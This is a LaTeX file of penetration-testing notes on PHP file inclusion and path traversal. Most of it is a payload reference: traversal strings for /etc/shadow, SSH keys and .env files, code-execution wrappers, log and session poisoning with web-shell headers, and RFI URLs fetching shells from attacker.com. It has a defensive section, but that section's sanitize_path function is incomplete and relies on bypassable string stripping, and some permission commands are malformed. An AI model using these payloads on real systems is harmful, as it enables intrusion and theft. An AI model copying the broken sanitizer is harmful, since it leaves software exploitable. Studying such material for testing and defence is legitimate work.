@@ -1,0 +1,1186 @@
+\documentclass[12pt]{article}
+
+\usepackage[a4paper,margin=0.5in]{geometry}
+\usepackage{listings}
+\usepackage{xcolor}
+\usepackage{hyperref}
+\usepackage{enumitem}
+\usepackage{titlesec}
+\usepackage{tcolorbox}
+\usepackage{longtable}
+\usepackage{multicol}
+\usepackage{booktabs}
+
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
+\definecolor{infoboxcolor}{rgb}{0.9,0.95,1}
+\definecolor{warningcolor}{rgb}{1,0.95,0.9}
+\definecolor{criticalcolor}{rgb}{1,0.9,0.9}
+
+\lstdefinestyle{mystyle}{
+    backgroundcolor=\color{backcolour},
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{blue},
+    numberstyle=\tiny\color{codegray},
+    stringstyle=\color{codepurple},
+    basicstyle=\ttfamily\small,
+    breaklines=true,
+    captionpos=b,
+    keepspaces=true,
+    numbers=left,
+    numbersep=5pt,
+    showspaces=false,
+    showstringspaces=false,
+    showtabs=false,
+    tabsize=2
+}
+
+\lstset{style=mystyle}
+
+% Custom boxes
+\newtcolorbox{infobox}[1][]{colback=infoboxcolor,colframe=blue!50!black,title=#1,boxrule=1pt}
+\newtcolorbox{warningbox}[1][]{colback=warningcolor,colframe=orange!50!black,title=#1,boxrule=1pt}
+\newtcolorbox{criticalbox}[1][]{colback=criticalcolor,colframe=red!50!black,title=#1,boxrule=1pt}
+
+\title{LFI, LFD, RFI, and Path Traversal Notes}
+\author{Eyad Islam El-Taher}
+\date{\today}
+
+\begin{document}
+
+\maketitle
+\tableofcontents
+\newpage
+
+% ==================================================
+\section{Introduction}
+
+File-related vulnerabilities are among the most dangerous web application vulnerabilities because they may allow attackers to:
+
+\begin{itemize}
+    \item Read sensitive files
+    \item Execute commands on the server
+    \item Access configuration files
+    \item Leak passwords and API keys
+    \item Escalate to Remote Code Execution (RCE)
+\end{itemize}
+
+These vulnerabilities usually occur when developers allow user input to interact directly with filesystem functions without proper validation.
+
+The most common vulnerabilities are:
+
+\begin{enumerate}
+    \item Local File Inclusion (LFI)
+    \item Local File Disclosure (LFD)
+    \item Remote File Inclusion (RFI)
+    \item Path Traversal
+\end{enumerate}
+
+% ==================================================
+\section{Local File Inclusion (LFI)}
+
+\subsection{Definition}
+
+Local File Inclusion (LFI) happens when a web application includes files from the local server using user-controlled input.
+
+The attacker manipulates parameters to force the application to load unintended local files.
+
+\subsection{Why It Happens}
+
+LFI usually occurs because developers use dangerous PHP functions directly with user input.
+
+Common vulnerable functions:
+
+\begin{itemize}
+    \item include()
+    \item include\_once()
+    \item require()
+    \item require\_once()
+\end{itemize}
+
+\subsection{Vulnerable Code Example}
+
+\begin{lstlisting}[language=PHP]
+<?php
+include("files/" . $_GET['language']);
+?>
+\end{lstlisting}
+
+The application expects:
+
+\begin{lstlisting}
+/index.php?language=english.php
+\end{lstlisting}
+
+But the attacker sends:
+
+\begin{lstlisting}
+/index.php?language=../../../../etc/passwd
+\end{lstlisting}
+
+This attempts to read the Linux password file.
+
+\subsection{How LFI Works}
+
+The attack works because:
+
+\begin{enumerate}
+    \item User input is directly appended to filesystem paths
+    \item The application does not validate the input
+    \item The server processes traversal sequences like ../
+    \item Sensitive files become accessible
+\end{enumerate}
+
+% ==================================================
+\section{Advanced LFI Techniques}
+
+\subsection{Null Byte Injection (Old PHP)}
+
+In older PHP versions (before 5.3.4), null bytes terminated strings.
+
+\begin{lstlisting}
+/index.php?page=../../../../etc/passwd%00
+\end{lstlisting}
+
+The null byte (\textbackslash 0) tells PHP to ignore the appended extension.
+
+\begin{warningbox}[Legacy Technique]
+Null byte injection only works in PHP versions before 5.3.4. Modern versions are patched.
+\end{warningbox}
+
+\subsection{Path Truncation}
+
+Some PHP versions truncate long paths.
+
+\begin{lstlisting}
+/index.php?page=../../../../etc/passwd............
+\end{lstlisting}
+
+Adding many dots or slashes may bypass checks.
+
+\subsection{Double Encoding}
+
+Bypass filters by encoding twice:
+
+\begin{lstlisting}
+..%252f..%252f..%252fetc/passwd
+\end{lstlisting}
+
+\begin{infobox}[How Double Encoding Works]
+The server decodes \%252f to \%2f, then decodes again to /. The filter may only check for ../ and miss the encoded version.
+\end{infobox}
+
+\subsection{Alternative Traversal Sequences}
+
+Different systems accept different sequences:
+
+\begin{lstlisting}
+# Windows
+..\\..\\..\\windows\\win.ini
+..\\/..\\/..\\/etc/passwd
+
+# Unix
+....//....//....//etc/passwd
+..;/..;/..;/etc/passwd
+
+# All systems
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+%252e%252e%252fetc/passwd
+\end{lstlisting}
+
+\subsection{URL Encoding Variations}
+
+\begin{longtable}{|l|l|}
+\hline
+\textbf{Character} & \textbf{Encodings} \\
+\hline
+. & \%2e, \%2E, \%252e \\
+/ & \%2f, \%2F, \%252f \\
+\textbackslash & \%5c, \%5C, \%255c \\
+: & \%3a, \%3A, \%253a \\
+\hline
+\end{longtable}
+
+% ==================================================
+\section{Local File Disclosure (LFD)}
+
+\subsection{Definition}
+
+Local File Disclosure (LFD) is similar to LFI, but the attacker can only read files rather than execute them.
+
+The vulnerability discloses sensitive file contents.
+
+\subsection{Difference Between LFI and LFD}
+
+\begin{longtable}{|p{5cm}|p{5cm}|}
+\hline
+\textbf{LFI} & \textbf{LFD} \\
+\hline
+May execute code & Only discloses files \\
+\hline
+Can lead to RCE & Usually information leakage only \\
+\hline
+Includes files into application & Reads file contents \\
+\hline
+\end{longtable}
+
+\subsection{Advanced PHP Wrappers}
+
+\subsubsection{php://filter - Read Source Code}
+
+\begin{lstlisting}
+# Read raw PHP source (base64 encoded)
+/index.php?page=php://filter/convert.base64-encode/resource=index.php
+
+# Read with multiple filters
+/index.php?page=php://filter/string.toupper|string.rot13/resource=config.php
+
+# Read and convert to lowercase
+/index.php?page=php://filter/string.tolower/resource=db.php
+\end{lstlisting}
+
+\subsubsection{php://filter Chain Multiple Filters}
+
+\begin{lstlisting}
+# Apply multiple transformations
+php://filter/convert.base64-encode|convert.iconv.utf-8.utf-16|string.rot13/resource=file
+\end{lstlisting}
+
+\subsubsection{php://input - Execute POST Data}
+
+\begin{lstlisting}
+# Send PHP code in POST body
+POST /index.php?page=php://input
+Content-Type: text/plain
+
+<?php system('id'); ?>
+\end{lstlisting}
+
+\begin{criticalbox}[PHP Input Requirement]
+php://input requires \texttt{allow\_url\_include = On} and \texttt{allow\_url\_fopen = On}.
+\end{criticalbox}
+
+\subsubsection{php://temp - Temporary Storage}
+
+\begin{lstlisting}
+/index.php?page=php://temp
+\end{lstlisting}
+
+May contain uploaded file data or temporary content.
+
+\subsubsection{php://memory - Memory Stream}
+
+Similar to php://temp but always uses memory.
+
+\subsubsection{expect:// - Command Execution}
+
+\begin{lstlisting}
+/index.php?page=expect://id
+/index.php?page=expect://ls -la
+\end{lstlisting}
+
+\begin{warningbox}[Expect Wrapper]
+The expect wrapper is rarely enabled. It requires the expect extension.
+\end{warningbox}
+
+\subsubsection{file:// - Absolute Path Reading}
+
+\begin{lstlisting}
+/index.php?page=file:///etc/passwd
+/index.php?page=file://C:/windows/win.ini
+\end{lstlisting}
+
+\subsection{Data Wrapper for Code Execution}
+
+\begin{lstlisting}
+# Execute PHP code directly
+/index.php?page=data://text/plain,<?php system('id'); ?>
+
+# Base64 encoded version
+/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
+\end{lstlisting}
+
+\subsection{Zip Wrapper for File Reading}
+
+\begin{lstlisting}
+# Read files inside zip archives
+/index.php?page=zip://path/to/file.zip%23internalfile.txt
+\end{lstlisting}
+
+\subsection{Phar Wrapper for Deserialization}
+
+\begin{lstlisting}
+/index.php?page=phar://path/to/file.phar/internal.txt
+\end{lstlisting}
+
+\subsection{SSH2 Wrapper}
+
+\begin{lstlisting}
+/index.php?page=ssh2.shell://user:pass@host/command
+\end{lstlisting}
+
+% ==================================================
+\section{Remote File Inclusion (RFI)}
+
+\subsection{Definition}
+
+Remote File Inclusion (RFI) occurs when the application allows attackers to include remote files hosted on external servers.
+
+The server downloads and executes attacker-controlled files.
+
+\subsection{Basic RFI Example}
+
+\begin{lstlisting}
+/vuln.php?file=http://attacker.com/shell.txt
+/vuln.php?file=https://pastebin.com/raw/shellcode
+/vuln.php?file=ftp://attacker.com/shell.php
+\end{lstlisting}
+
+\subsection{Why RFI Is Dangerous}
+
+RFI can directly lead to:
+
+\begin{itemize}
+    \item Remote Code Execution
+    \item Web shells
+    \item Full server compromise
+    \item Malware installation
+\end{itemize}
+
+\subsection{Bypassing allow\_url\_include Restrictions}
+
+If allow\_url\_include is disabled, try:
+
+\begin{lstlisting}
+# Upload shell as image, then include
+/vuln.php?file=http://attacker.com/shell.jpg
+
+# Use FTP wrapper
+/vuln.php?file=ftp://attacker.com/shell.txt
+
+# Use WebDAV
+/vuln.php?file=http://attacker.com@evil.com/shell
+\end{lstlisting}
+
+\subsection{Using Log Files for RFI Alternative}
+
+Even with RFI disabled, you can include local logs:
+
+\begin{lstlisting}
+/vuln.php?file=/var/log/apache2/access.log
+/vuln.php?file=/var/log/nginx/error.log
+/vuln.php?file=../../../../logs/error.log
+\end{lstlisting}
+
+% ==================================================
+\section{LFI to RCE - Advanced Techniques}
+
+\subsection{Log Poisoning - Detailed}
+
+\subsubsection{Step 1: Poison the Log}
+
+Send a malicious User-Agent:
+
+\begin{lstlisting}[language=bash]
+User-Agent: <?php system($_GET['cmd']); ?>
+\end{lstlisting}
+
+Or inject via other HTTP headers:
+
+\begin{lstlisting}
+Referer: <?php system($_GET['cmd']); ?>
+X-Forwarded-For: <?php system($_GET['cmd']); ?>
+Cookie: <?php system($_GET['cmd']); ?>
+\end{lstlisting}
+
+\subsubsection{Step 2: Include the Log File}
+
+\begin{lstlisting}
+/index.php?page=/var/log/apache2/access.log&cmd=id
+\end{lstlisting}
+
+\subsubsection{Common Log Locations}
+
+\begin{longtable}{|l|l|}
+\hline
+\textbf{Log File} & \textbf{Location} \\
+\hline
+Apache access log & /var/log/apache2/access.log \\
+\hline
+Apache error log & /var/log/apache2/error.log \\
+\hline
+Nginx access log & /var/log/nginx/access.log \\
+\hline
+Nginx error log & /var/log/nginx/error.log \\
+\hline
+SSH log & /var/log/auth.log \\
+\hline
+Mail log & /var/log/mail.log \\
+\hline
+Kernel log & /var/log/kern.log \\
+\hline
+\end{longtable}
+
+\subsection{Session Poisoning}
+
+\subsubsection{Step 1: Find Session Location}
+
+Common session paths:
+
+\begin{lstlisting}
+/var/lib/php/sessions/sess_[SESSION_ID]
+/tmp/sess_[SESSION_ID]
+/var/lib/php5/sess_[SESSION_ID]
+\end{lstlisting}
+
+\subsubsection{Step 2: Poison Session}
+
+Set session value via parameter:
+
+\begin{lstlisting}
+/index.php?language=<?php system('id'); ?>
+\end{lstlisting}
+
+\subsubsection{Step 3: Include Session File}
+
+\begin{lstlisting}
+/index.php?page=/var/lib/php/sessions/sess_abc123
+\end{lstlisting}
+
+\subsection{Environment Variable Injection}
+
+Read /proc/self/environ:
+
+\begin{lstlisting}
+/index.php?page=../../../../proc/self/environ
+\end{lstlisting}
+
+If you can control environment variables (User-Agent, etc.), inject PHP code.
+
+\subsection{FD (File Descriptor) Exploitation}
+
+Linux stores process information in /proc:
+
+\begin{lstlisting}
+/proc/self/fd/[0-9]+
+/proc/[PID]/fd/[0-9]+
+\end{lstlisting}
+
+Bruteforce file descriptors to find open files.
+
+\subsection{/proc/self/mem - Memory Reading}
+
+Advanced technique to read process memory:
+
+\begin{lstlisting}
+/proc/self/mem
+/proc/self/maps
+\end{lstlisting}
+
+\subsection{Uploaded File Inclusion}
+
+Find temporary uploaded files:
+
+\begin{lstlisting}
+/tmp/php[0-9a-zA-Z]*
+/var/tmp/php[0-9a-zA-Z]*
+\end{lstlisting}
+
+Race condition: include file before PHP deletes it.
+
+\subsection{SSH Log Poisoning}
+
+If you can log in via SSH (even with wrong password):
+
+\begin{lstlisting}
+ssh '<?php system($_GET["cmd"]); ?>'@target.com
+\end{lstlisting}
+
+Then include:
+
+\begin{lstlisting}
+/index.php?page=/var/log/auth.log&cmd=id
+\end{lstlisting}
+
+\subsection{Mail Log Poisoning}
+
+Send email to local user:
+
+\begin{lstlisting}
+mail -s "<?php system('id'); ?>" user@localhost < /dev/null
+\end{lstlisting}
+
+Include the mail log:
+
+\begin{lstlisting}
+/index.php?page=/var/log/mail.log
+\end{lstlisting}
+
+\subsection{/proc/self/fd Inclusion}
+
+When normal paths are blocked, try file descriptors:
+
+\begin{lstlisting}
+/index.php?page=/proc/self/fd/0
+/index.php?page=/proc/self/fd/1
+/index.php?page=/proc/self/fd/2
+... bruteforce 0-50
+\end{lstlisting}
+
+% ==================================================
+\section{Path Traversal - Advanced}
+
+\subsection{Base Path Bypass Techniques}
+
+When the application adds a base path:
+
+\begin{lstlisting}
+# Original: file.php?page=news.html
+# App does: include("/var/www/pages/" . $_GET['page'])
+
+# Bypass with traversal
+file.php?page=../../../../etc/passwd
+
+# Or absolute path
+file.php?page=/etc/passwd
+
+# Null byte (old PHP)
+file.php?page=../../../../etc/passwd%00
+\end{lstlisting}
+
+\subsection{Extension Bypass Techniques}
+
+When the application adds .php extension:
+
+\begin{lstlisting}
+# Use null byte (old PHP)
+page=../../../../etc/passwd%00
+
+# Use path truncation (old PHP)
+page=../../../../etc/passwd/././././././.
+
+# Use query parameters
+page=../../../../etc/passwd?anything
+
+# Use fragment
+page=../../../../etc/passwd#anything
+\end{lstlisting}
+
+\subsection{WAF Bypass Techniques}
+
+\subsubsection{Case Manipulation}
+
+\begin{lstlisting}
+../
+..\\
+..\%2f
+..%c0%af
+..%c1%9c
+%2e%2e%2f
+%2e%2e/
+..%252f
+%252e%252e%252f
+\end{lstlisting}
+
+\subsubsection{Unicode Bypasses}
+
+\begin{lstlisting}
+%c0%ae%c0%ae%c0%af  (Unicode encoding)
+%uff0e%uff0e%uff0f   (Fullwidth encoding)
+%e0%40%ae%e0%40%ae%e0%40%af
+\end{lstlisting}
+
+\subsubsection{Double Traversal}
+
+\begin{lstlisting}
+....//
+....\/
+..././
+\end{lstlisting}
+
+\subsection{OS-Specific Paths}
+
+\subsubsection{Windows Path Traversal}
+
+\begin{lstlisting}
+..\\..\\..\\windows\\win.ini
+..\\..\\..\\boot.ini
+..\\..\\..\\autoexec.bat
+..\\..\\..\\config.sys
+C:\\boot.ini
+C:\\windows\\system32\\drivers\\etc\\hosts
+\end{lstlisting}
+
+\subsubsection{Linux Path Traversal}
+
+\begin{lstlisting}
+../../../../etc/passwd
+../../../../etc/shadow
+../../../../root/.bash_history
+../../../../var/log/apache2/access.log
+../../../../home/user/.ssh/id_rsa
+../../../../proc/self/environ
+../../../../proc/version
+\end{lstlisting}
+
+% ==================================================
+\section{Important Files to Target}
+
+\subsection{Linux Critical Files}
+
+\begin{longtable}{|l|l|}
+\hline
+\textbf{File} & \textbf{Purpose} \\
+\hline
+/etc/passwd & User accounts \\
+\hline
+/etc/shadow & Password hashes (requires root) \\
+\hline
+/etc/hosts & DNS resolution \\
+\hline
+/etc/hostname & System name \\
+\hline
+/etc/issue & OS identification \\
+\hline
+/proc/version & Kernel version \\
+\hline
+/proc/self/environ & Environment variables \\
+\hline
+/proc/self/cmdline & Running command line \\
+\hline
+/proc/self/fd/* & File descriptors \\
+\hline
+/proc/self/maps & Memory mapping \\
+\hline
+/var/log/apache2/access.log & Access logs \\
+\hline
+/var/log/nginx/access.log & Nginx logs \\
+\hline
+/var/log/auth.log & Authentication logs \\
+\hline
+/home/*/.bash\_history & Command history \\
+\hline
+/home/*/.ssh/id\_rsa & SSH private keys \\
+\hline
+/root/.ssh/id\_rsa & Root SSH keys \\
+\hline
+/etc/nginx/nginx.conf & Nginx config \\
+\hline
+/etc/apache2/apache2.conf & Apache config \\
+\hline
+/etc/mysql/my.cnf & MySQL config \\
+\hline
+/etc/php/*/php.ini & PHP config \\
+\hline
+\end{longtable}
+
+\subsection{Windows Critical Files}
+
+\begin{longtable}{|l|l|}
+\hline
+\textbf{File} & \textbf{Purpose} \\
+\hline
+C:\textbackslash windows\textbackslash win.ini & Windows info \\
+\hline
+C:\textbackslash boot.ini & Boot configuration \\
+\hline
+C:\textbackslash windows\textbackslash system32\textbackslash drivers\textbackslash etc\textbackslash hosts & Hosts file \\
+\hline
+C:\textbackslash windows\textbackslash system32\textbackslash config\textbackslash SAM & Password hashes \\
+\hline
+C:\textbackslash windows\textbackslash system32\textbackslash config\textbackslash SYSTEM & Registry \\
+\hline
+C:\textbackslash windows\textbackslash php.ini & PHP config \\
+\hline
+C:\textbackslash inetpub\textbackslash wwwroot\textbackslash web.config & IIS config \\
+\hline
+C:\textbackslash xampp\textbackslash htdocs\textbackslash index.php & Web root \\
+\hline
+C:\textbackslash users\textbackslash *\textbackslash Desktop\textbackslash * & User files \\
+\hline
+C:\textbackslash Program Files\textbackslash *\textbackslash config\textbackslash * & App configs \\
+\hline
+\end{longtable}
+
+\subsection{Application-Specific Files}
+
+\begin{longtable}{|l|l|}
+\hline
+\textbf{Application} & \textbf{Config Files} \\
+\hline
+WordPress & wp-config.php, .htaccess \\
+\hline
+Drupal & settings.php \\
+\hline
+Joomla & configuration.php \\
+\hline
+Laravel & .env, config/database.php \\
+\hline
+Django & settings.py \\
+\hline
+Rails & config/database.yml \\
+\hline
+Spring Boot & application.properties \\
+\hline
+Node.js & .env, config.js \\
+\hline
+\end{longtable}
+
+% ==================================================
+\section{Detection Methodology}
+
+\subsection{Step-by-Step Testing Process}
+
+\begin{enumerate}
+    \item Identify parameters that reference files
+    \item Test basic traversal sequences
+    \item Observe errors and responses
+    \item Try wrapper payloads (php://filter, etc.)
+    \item Attempt encoding bypasses
+    \item Check for log inclusion
+    \item Test for code execution via log/session poisoning
+    \item Bruteforce for backup/config files
+\end{enumerate}
+
+\subsection{Parameter Fuzzing Wordlist}
+
+Common parameters to test:
+
+\begin{multicols}{3}
+\begin{itemize}
+    \item page
+    \item file
+    \item include
+    \item template
+    \item view
+    \item content
+    \item language
+    \item lang
+    \item path
+    \item url
+    \item redirect
+    \item load
+    \item read
+    \item data
+    \item doc
+    \item document
+    \item folder
+    \item root
+    \item location
+\end{itemize}
+\end{multicols}
+
+\subsection{Error Analysis}
+
+Different errors indicate different things:
+
+\begin{longtable}{|l|l|}
+\hline
+\textbf{Error Message} & \textbf{Indicator} \\
+\hline
+"failed to open stream" & Path exists, but can't read \\
+\hline
+"No such file or directory" & Path doesn't exist \\
+\hline
+"include()" warning & PHP include function \\
+\hline
+File contents displayed & Direct LFI/LFD \\
+\hline
+Base64 encoded output & php://filter working \\
+\hline
+Binary/gibberish output & Binary file read \\
+\hline
+\end{longtable}
+
+% ==================================================
+\section{Complete Payload Reference}
+
+\subsection{Basic Detection Payloads}
+
+\begin{lstlisting}
+# Linux
+/etc/passwd
+../../../../etc/passwd
+....//....//....//etc/passwd
+..;/..;/..;/etc/passwd
+
+# Windows
+windows/win.ini
+../../../../windows/win.ini
+..\\..\\..\\windows\\win.ini
+\end{lstlisting}
+
+\subsection{Wrappers and Filters}
+
+\begin{lstlisting}
+# PHP filter (read source)
+php://filter/convert.base64-encode/resource=index.php
+php://filter/string.tolower/resource=index.php
+php://filter/string.rot13/resource=index.php
+
+# PHP input (RCE)
+php://input
+[POST data: <?php system('id'); ?>]
+
+# Data wrapper
+data://text/plain,<?php system('id'); ?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
+
+# Expect wrapper
+expect://id
+expect://ls -la
+
+# Zip wrapper
+zip:///tmp/shell.jpg%23shell.php
+
+# Phar wrapper
+phar:///path/to/phar.phar/file
+
+# SSH2 wrapper
+ssh2.shell://user:pass@host/command
+\end{lstlisting}
+
+\subsection{Log Poisoning Payloads}
+
+\begin{lstlisting}
+# Malicious headers
+User-Agent: <?php system($_GET['c']); ?>
+Referer: <?php system($_GET['c']); ?>
+X-Forwarded-For: <?php system($_GET['c']); ?>
+Cookie: <?php system($_GET['c']); ?>
+
+# Include log
+/index.php?page=/var/log/apache2/access.log&c=id
+/index.php?page=/var/log/nginx/access.log&c=id
+\end{lstlisting}
+
+\subsection{Session Poisoning Payloads}
+
+\begin{lstlisting}
+# Poison session via parameter
+/index.php?lang=<?php system('id'); ?>
+
+# Find session path
+/var/lib/php/sessions/sess_[SESSION_ID]
+/tmp/sess_[SESSION_ID]
+
+# Include session
+/index.php?page=/var/lib/php/sessions/sess_abc123
+\end{lstlisting}
+
+\subsection{Proc Filesystem Payloads}
+
+\begin{lstlisting}
+# Environment variables
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/fd/0-50
+/proc/self/maps
+/proc/self/mem
+/proc/version
+/proc/cpuinfo
+/proc/mounts
+\end{lstlisting}
+
+\subsection{Encoding Bypass Payloads}
+
+\begin{lstlisting}
+# Single encoding
+..%2f..%2f..%2fetc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+
+# Double encoding
+..%252f..%252f..%252fetc/passwd
+%252e%252e%252f%252e%252e%252fetc/passwd
+
+# Unicode encoding
+%c0%ae%c0%ae%c0%afetc/passwd
+%uff0e%uff0e%uff0fetc/passwd
+
+# Alternative traversal
+....//....//....//etc/passwd
+..;/..;/..;/etc/passwd
+\end{lstlisting}
+
+% ==================================================
+\section{Framework and CMS Specific}
+
+\subsection{WordPress LFI}
+
+\begin{lstlisting}
+# Theme file inclusion
+/wp-content/themes/theme-name/../../../../wp-config.php
+
+# Plugin vulnerability
+/wp-content/plugins/plugin-name/../../../../wp-config.php
+
+# wp-config location
+../../../../wp-config.php
+../../../../wp-config.php%00
+\end{lstlisting}
+
+\subsection{Laravel LFI}
+
+\begin{lstlisting}
+# Read .env file
+../../../../.env
+../../../../.env%00
+
+# Read logs
+/storage/logs/laravel.log
+../../../../storage/logs/laravel.log
+
+# Read config
+/config/app.php
+../../../../config/database.php
+\end{lstlisting}
+
+\subsection{Drupal LFI}
+
+\begin{lstlisting}
+# Settings file
+../../../../sites/default/settings.php
+
+# Module inclusion
+/modules/contrib/module/../../../../sites/default/settings.php
+\end{lstlisting}
+
+% ==================================================
+\section{Tools and Automation}
+
+\subsection{Useful Tools}
+
+\begin{itemize}
+    \item \textbf{Burp Suite} - Intruder for fuzzing
+    \item \textbf{LFISuite} - Automated LFI exploitation
+    \item \textbf{kadimus} - LFI scanner and exploiter
+    \item \textbf{liffy} - LFI exploitation tool
+\end{itemize}
+
+\newpage
+\subsection{ffuf Fuzzing Examples}
+
+\begin{lstlisting}[language=bash]
+# Fuzz for LFI parameters
+ffuf -u 'https://target.com/page.php?FUZZ=../../../../etc/passwd' -w parameter-wordlist.txt -fs 0
+
+# Fuzz for files
+ffuf -u 'https://target.com/index.php?page=FUZZ' -w lfi-wordlist.txt -fs 0
+
+# Fuzz with payload list
+ffuf -u 'https://target.com/index.php?page=FUZZ' -w payloads.txt -fc 404
+\end{lstlisting}
+
+
+% ==================================================
+\section{Important Notes for Bug Bounty and Pentesting}
+
+\begin{infobox}[Key Points]
+\begin{itemize}
+    \item Modern frameworks reduce these vulnerabilities
+    \item Legacy PHP applications are more vulnerable
+    \item File uploads can increase exploitation chances
+    \item Misconfigured permissions make attacks easier
+    \item LFI often becomes critical when chained with another vulnerability
+\end{itemize}
+\end{infobox}
+
+\begin{warningbox}[Testing Tips]
+\begin{itemize}
+    \item Always test with multiple encoding variations
+    \item Check error messages for path disclosure
+    \item Try to read the application's own source code first
+    \item Use collaborator for out-of-band detection
+    \item Document all successful and interesting payloads
+\end{itemize}
+\end{warningbox}
+
+% ==================================================
+
+
+% ==================================================
+\section{Mitigation and Prevention}
+
+Proper mitigation of file inclusion and path traversal vulnerabilities requires a defense-in-depth approach. No single control is sufficient; multiple layers of protection should be implemented.
+
+\subsection{Core Prevention Principles}
+
+\begin{infobox}[The Golden Rules]
+\begin{enumerate}
+    \item \textbf{Never trust user input} - All file-related parameters must be treated as malicious
+    \item \textbf{Use whitelists, not blacklists} - Allow only explicitly approved values
+    \item \textbf{Apply least privilege} - Web server should have minimal filesystem access
+    \item \textbf{Validate early and often} - Check input at every boundary
+\end{enumerate}
+\end{infobox}
+
+\subsection{Input Validation Strategies}
+
+\subsubsection{Whitelist Approach (Recommended)}
+
+The most secure approach is to map user input to predefined allowed values.
+
+\begin{lstlisting}[language=PHP, caption=Whitelist Implementation]
+<?php
+// Secure: Whitelist approach
+$allowed_pages = [
+    'home' => 'home.php',
+    'about' => 'about.php',
+    'contact' => 'contact.php',
+    'products' => 'products.php'
+];
+
+$page = $_GET['page'] ?? 'home';
+
+if (array_key_exists($page, $allowed_pages)) {
+    include($allowed_pages[$page]);
+} else {
+    // Log the attempt and show error page
+    error_log("Unauthorized page access attempt: " . $page);
+    include('error.php');
+}
+?>
+\end{lstlisting}
+
+\subsubsection{Path Sanitization (Defense in Depth)}
+
+If whitelisting is not possible, sanitize the input thoroughly:
+
+\begin{lstlisting}[language=PHP, caption=Path Sanitization Functions]
+<?php
+function sanitize_path($path) {
+    // Remove null bytes
+    $path = str_replace(chr(0), '', $path);
+    
+    // Remove dangerous sequences
+    $path = str_replace(['../', '..\\', './', '.\\'], '', $path);
+    
+    // Remove multiple encodings
+    $path = urldecode($path);
+    $path = str_replace(['%2e%2e%2f', '%2e%2e/'], '', $path);
+    
+    // Normalize path separators
+    $path = str_replace('\\', '/', $path);
+    
+    // Remove any remaining traversal attempts
+    $path = preg_replace('/\.\.+\//', '', $path);
+?>
+\end{lstlisting}
+
+
+\subsection{File System Permissions}
+
+\subsubsection{Principle of Least Privilege}
+
+\begin{lstlisting}[language=bash, caption=Secure File Permissions]
+# Set proper ownership
+chown -R www-data:www-data /var/www/html
+
+# Restrict permissions
+chmod -R 750 /var/www/html
+
+# Sensitive directories
+chmod 700 /var/www/html/config
+chmod 600 /var/www/html/config/database.php
+
+# Prevent writing to web root
+chmod 555 /var/www/html
+
+# Separate upload directory
+mkdir /var/www/uploads
+chown www-data:www-data /var/www/uploads
+chmod 755 /var/www/uploads
+\end{lstlisting}
+
+\subsubsection{Preventing Log Poisoning}
+
+\begin{lstlisting}[language=bash, caption=Protecting Log Files]
+# Log directory permissions
+chmod 750 /var/log/apache2
+chmod 640 /var/log/apache2/*.log
+
+# Rotate logs regularly
+# Prevent log files from becoming world-readable
+umask 027 for log files
+\end{lstlisting}
+
+\subsection{Secure Coding Practices}
+
+\subsubsection{Using Basename for Filename Extraction}
+
+\begin{lstlisting}[language=PHP, caption=Secure File Name Handling]
+<?php
+// Only extract filename, ignore paths
+$filename = basename($_GET['file']);
+$safe_path = "/var/www/html/files/" . $filename;
+
+// Verify file exists and is within allowed directory
+$real_path = realpath($safe_path);
+$allowed_dir = realpath('/var/www/html/files/');
+
+if ($real_path && strpos($real_path, $allowed_dir) === 0) {
+    readfile($real_path);
+} else {
+    http_response_code(404);
+    exit;
+}
+?>
+\end{lstlisting}
+
+\subsubsection{Using Realpath for Path Validation}
+
+\begin{lstlisting}[language=PHP, caption=Path Resolution and Validation]
+<?php
+function validate_file_path($user_path, $base_dir) {
+    // Resolve the full path
+    $full_path = realpath($base_dir . DIRECTORY_SEPARATOR . $user_path);
+    
+    // Check if path resolution succeeded
+    if ($full_path === false) {
+        return false;
+    }
+    
+    // Ensure the path is within base directory
+    if (strpos($full_path, realpath($base_dir)) !== 0) {
+        return false;
+    }
+    
+    // Check file extension (whitelist)
+    $allowed_extensions = ['html', 'txt', 'pdf', 'jpg', 'png'];
+    $extension = pathinfo($full_path, PATHINFO_EXTENSION);
+    
+    if (!in_array($extension, $allowed_extensions)) {
+        return false;
+    }
+    
+    return $full_path;
+}
+
+// Usage
+$base = '/var/www/html/pages/';
+$user_file = $_GET['page'] ?? '';
+$valid_path = validate_file_path($user_file, $base);
+
+if ($valid_path && file_exists($valid_path)) {
+    include($valid_path);
+} else {
+    http_response_code(403);
+    echo "Access denied";
+}
+?>
+\end{lstlisting}
+
+
+\begin{criticalbox}[Key Takeaway]
+The most effective mitigation for file inclusion and path traversal vulnerabilities is to \textbf{never directly use user input in filesystem operations}. Always use whitelists, mapping tables, or database IDs instead of file paths.
+\end{criticalbox}
+
+
+\begin{center}
+\textbf{Never trust user-controlled file paths.}
+\end{center}
+
+
+\end{document}
